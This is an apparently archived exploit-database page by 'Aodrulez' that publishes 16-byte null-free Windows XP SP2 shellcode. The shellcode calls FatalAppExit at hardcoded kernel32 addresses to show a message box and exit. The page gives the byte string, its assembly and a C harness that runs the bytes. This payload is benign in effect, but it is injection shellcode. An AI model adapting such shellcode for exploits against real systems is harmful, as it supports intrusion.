<html><head><title>Windows - XP Pro Sp2 English Message-Box Shellcode - 16 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
+-----------------------------------------------------+
| Windows XP Pro Sp2 English &quot;Message-Box&quot; Shellcode. |
+-----------------------------------------------------+

Size         : 16 Bytes, Null-Free.
Author       : Aodrulez. 
Email        : f3arm3d3ar@gmail.com


Shellcode = &quot;\xB9\x38\xDD\x82\x7C\x33\xC0\xBB&quot;
            &quot;\xD8\x0A\x86\x7C\x51\x50\xFF\xd3&quot;;


+--------------+
| Description: |
+--------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I've used a Function called &quot;FatalAppExit&quot;.
The Benefits are Three-Fold!

1] Displays a MessageBox.
2] Terminates the Process. 
3] Its there in Kernel32.dll itself.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+-----------+
| Asm Code: |
+-----------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

shellcode:
 	      mov ecx,7c82dd38h ;&quot;Admin&quot; string in mem
 	      xor eax,eax
 	      mov ebx,7c860ad8h ;Addr of &quot;FatalAppExit()&quot; 
 		push ecx          ;function from Kernel32
 		push eax          
 		call ebx          ;App does a Clean Exit.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


+-----------------+
| Shellcodetest.c |
+-----------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

char code[] = &quot;\xB9\x38\xDD\x82\x7C\x33\xC0\xBB&quot;
              &quot;\xD8\x0A\x86\x7C\x51\x50\xFF\xd3&quot;;


int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


+-------------------+
| Greetz Fly Out To |
+-------------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1] Amforked()	 : My Mentor.
2] The Blue Genius : My Boss.
3] www.orchidseven.com
4] str0ke

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+---------------------------------------------+
| Forgive, O Lord, My Little Jokes on Thee,   |
| and I'll Forgive Thy Great Big Joke on Me.  |
+---------------------------------------------+


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
